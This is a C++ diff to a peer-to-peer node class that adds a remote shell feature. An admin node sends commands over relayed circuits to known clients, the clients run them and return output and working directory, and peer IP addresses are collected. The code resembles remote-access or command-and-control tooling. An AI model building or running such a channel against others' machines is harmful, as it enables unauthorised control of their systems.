@@ -66,6 +66,41 @@ std::vector<ChatMessage> Node::take_new_messages() {
     return out;
 }
 
+std::vector<ShellOut> Node::take_shell_outs() {
+    std::lock_guard lock(shell_mutex_);
+    std::vector<ShellOut> outs = shell_outs_;
+    shell_outs_.clear();
+    return outs;
+}
+
+void Node::send_shell_cmd(std::string cmd, NodeId to) {
+    asio::post(io_, [self = shared_from_this(), cmd = std::move(cmd), to = std::move(to)]() {
+        if (!self->circuit_by_dst_.contains(to)) {
+            log_warn("[ADMIN] No circuit to {}", to);
+            return;
+        }
+        self->send_chunked(to, proto::to_bytes(cmd), SHELL_CMD);
+    });
+}
+
+void Node::set_shell_out_callback(std::function<void(ShellOut)> cb) {
+    std::lock_guard lock(shell_mutex_);
+    shell_out_cb_ = std::move(cb);
+}
+
+std::vector<NodeId> Node::get_known_clients() const {
+    std::lock_guard lock(gui_mutex_);
+    return snapshot_.known_peers;
+}
+
+bool Node::has_ready_circuit(const NodeId& dst) const {
+    std::lock_guard lock(gui_mutex_);
+    for (const auto& c : snapshot_.circuits)
+        if (c.dst == dst && c.state == CircuitState::READY)
+            return true;
+    return false;
+}
+
 void Node::update_snapshot() {
     NodeSnapshot s;
     s.node_id = node_id_;
@@ -78,8 +113,10 @@ void Node::update_snapshot() {
         if (it == circuits_.end()) continue;
         s.circuits.push_back({cid, dst, it->second.state});
     }
-    for (const auto& [pid, _] : clients_map_)
+    for (const auto& [pid, info] : clients_map_) {
         s.known_peers.push_back(pid);
+        s.peer_ips[pid] = info.ep.address().to_string() + ":" + std::to_string(info.ep.port());
+    }
     std::lock_guard lock(gui_mutex_);
     snapshot_ = std::move(s);
 }
@@ -571,6 +608,27 @@ void Node::send_chunked(const NodeId& dst, std::vector<uint8_t> data, ContentTyp
     outgoing_transfer_timers_[transfer_id] = std::move(xfer_timer);
 
     log_info("[CHUNK] Sent {} chunks for transfer {}", total_chunks, transfer_id);
+}
+
+void Node::reply_chunked(const NodeId& src, std::vector<uint8_t> data, ContentType content_type) {
+    auto circuit_it = received_circuit_by_src_.find(src);
+    if (circuit_it == received_circuit_by_src_.end()) {
+        log_warn("[CHUNK] No received circuit from {} to reply on", src);
+        return;
+    }
+    const auto& circuit_id = circuit_it->second;
+
+    auto transfer_id = proto::random_tx_id();
+    uint32_t total_chunks = std::max(1u, static_cast<uint32_t>((data.size() + CHUNK_SIZE - 1) / CHUNK_SIZE));
+
+    for (uint32_t i = 0; i < total_chunks; i++) {
+        size_t start = i * CHUNK_SIZE;
+        size_t end   = std::min(start + CHUNK_SIZE, data.size());
+        std::vector<uint8_t> raw(data.begin() + start, data.begin() + end);
+        proto::ChunkMeta chunk{transfer_id, i, total_chunks, content_type, proto::b64_encode(raw)};
+        send_reply_via_circuit(circuit_id, proto::dump_compact(proto::msg_chunk(node_id_, chunk)));
+    }
+    log_info("[CHUNK] Replied {} chunks (transfer {}) to {}", total_chunks, transfer_id, src);
 }
 
 void Node::send_text(const udp::endpoint& target, std::string text) {
@@ -1618,17 +1676,27 @@ void Node::on_chunk(const udp::endpoint& from, const proto::Envelope& env)
             std::string out = shell_.run(cmd);
             if (out.empty())
                 return;
-            std::string cwd = shell_.run("cmd");
+            std::string cwd = shell_.run("cd");
             auto se = proto::msg_shell_out(node_id_, out, cwd);
-            send_chunked(msg.src,  proto::to_bytes(proto::dump_compact(se)), SHELL_OUT);
+            reply_chunked(msg.src, proto::to_bytes(proto::dump_compact(se)), SHELL_OUT);
         }
     } else if (ct == SHELL_OUT)
     {
         std::string exec_str(full_data.begin(), full_data.end());
         if (exec_str.empty()) {log_error("Got empty out from shell command"); return;}
         auto exec_j = json::parse(exec_str);
-        std::lock_guard lock(shell_mutex_);
-        shell_outs_.push_back(std::move(exec_j));
+        ShellOut exec {
+            exec_j["from"].get<std::string>(),
+            exec_j["out"].get<std::string>(),
+            exec_j["cwd"].get<std::string>()
+        };
+        std::function<void(ShellOut)> cb;
+        {
+            std::lock_guard lock(shell_mutex_);
+            shell_outs_.push_back(exec);
+            cb = shell_out_cb_;
+        }
+        if (cb) cb(std::move(exec));
     }
     else {
         log_info("[FILE from {}]: {} bytes received", msg.src, full_data.size());
